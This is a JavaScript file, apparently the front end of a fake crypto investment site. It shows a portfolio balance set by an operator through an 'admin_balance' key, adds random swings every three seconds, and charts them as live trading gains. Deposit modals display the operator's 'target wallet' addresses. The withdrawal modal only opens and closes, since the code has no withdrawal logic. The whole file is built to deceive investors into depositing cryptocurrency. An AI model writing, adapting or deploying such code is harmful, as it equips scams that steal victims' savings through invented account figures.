document.addEventListener('DOMContentLoaded', () => {
    // --- VALUE DEFINITIONS ---
    let currentBalance = parseFloat(localStorage.getItem('admin_balance')) || 1000.00;
    
    // Customize your three target addresses right here!
    let targetWallets = {
        'USDT (TRC20)': localStorage.getItem('admin_address') || "0x71C2496E7278274d3b4614a420971a9E3a9411bb",
        'Bitcoin (BTC Mainnet)': "1BitcoinTestAddressGoesHere111111",
        'Ethereum (ETH ERC20)': "0xEthTestAddressGoesHere2222222222"
    };

    function updateBalanceDisplay() {
        const display = document.getElementById('balance-display');
        if (display) {
            display.innerText = '$' + currentBalance.toFixed(2);
        }
    }
    updateBalanceDisplay();

    // --- MODAL CLICK HANDLERS ---
    window.triggerDepositModal = function() {
        const modal = document.getElementById('depositModal');
        if (modal) modal.style.display = 'flex';
    };

    window.closeDepositModal = function() {
        const modal = document.getElementById('depositModal');
        if (modal) modal.style.display = 'none';
    };

    window.triggerWithdrawalModal = function() {
        const modal = document.getElementById('withdrawModal');
        if (modal) modal.style.display = 'flex';
    };

    window.closeWithdrawModal = function() {
        const modal = document.getElementById('withdrawModal');
        if (modal) modal.style.display = 'none';
    };

    // --- INTERACTIVE SWAP SYSTEM FOR COINS ---
    window.switchCryptoNetwork = function(selectedNetwork) {
        const addressBox = document.getElementById('walletAddressBox');
        if (addressBox && targetWallets[selectedNetwork]) {
            addressBox.innerText = targetWallets[selectedNetwork];
        }
    };

    // --- LINE CHART ARCHITECTURE ---
    const chartElement = document.getElementById('LivePerformanceChart');
    if (!chartElement) return;
    const ctx = chartElement.getContext('2d');

    const greenColor = 'rgba(16, 185, 129, 1)';
    const greenGradientStart = 'rgba(16, 185, 129, 0.24)';
    const redColor = 'rgba(239, 68, 68, 1)';
    const redGradientStart = 'rgba(239, 68, 68, 0.24)';

    function getChartGradient(colorStart) {
        let gradient = ctx.createLinearGradient(0, 0, 0, 300);
        gradient.addColorStop(0, colorStart);
        gradient.addColorStop(1, 'rgba(0, 0, 0, 0.0)');
        return gradient;
    }

    const liveChart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: ['00:00', '04:00', '08:00', '12:00', '16:00', '20:00'],
            datasets: [{
                label: 'Portfolio Value (USDT)',
                data: [currentBalance * 0.992, currentBalance * 0.995, currentBalance * 0.991, currentBalance * 0.997, currentBalance * 0.994, currentBalance],
                borderColor: greenColor,
                borderWidth: 3,
                fill: true,
                backgroundColor: getChartGradient(greenGradientStart),
                tension: 0.4
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            plugins: { legend: { display: false } }
        }
    });

    // --- TIMED LIVE REFRESH SYNC ---
    setInterval(() => {
        const controlledBalance = parseFloat(localStorage.getItem('admin_balance'));
        const pctChange = (Math.random() * 0.3 - 0.15) / 100;
        const previousBalance = currentBalance;
        
        if (!isNaN(controlledBalance) && controlledBalance !== parseFloat(localStorage.getItem('_last_processed_controlled'))) {
            currentBalance = controlledBalance;
            localStorage.setItem('_last_processed_controlled', controlledBalance);
        } else {
            currentBalance = currentBalance * (1 + pctChange);
        }

        liveChart.data.datasets[0].data = [
            currentBalance * 0.992, currentBalance * 0.995, currentBalance * 0.991, currentBalance * 0.997, currentBalance * 0.994, currentBalance
        ];
        
        updateBalanceDisplay();

        if (currentBalance >= previousBalance) {
            liveChart.data.datasets[0].borderColor = greenColor;
            liveChart.data.datasets[0].backgroundColor = getChartGradient(greenGradientStart);
        } else {
            liveChart.data.datasets[0].borderColor = redColor;
            liveChart.data.datasets[0].backgroundColor = getChartGradient(redGradientStart);
        }

        liveChart.update('none'); 
    }, 3000); 
});
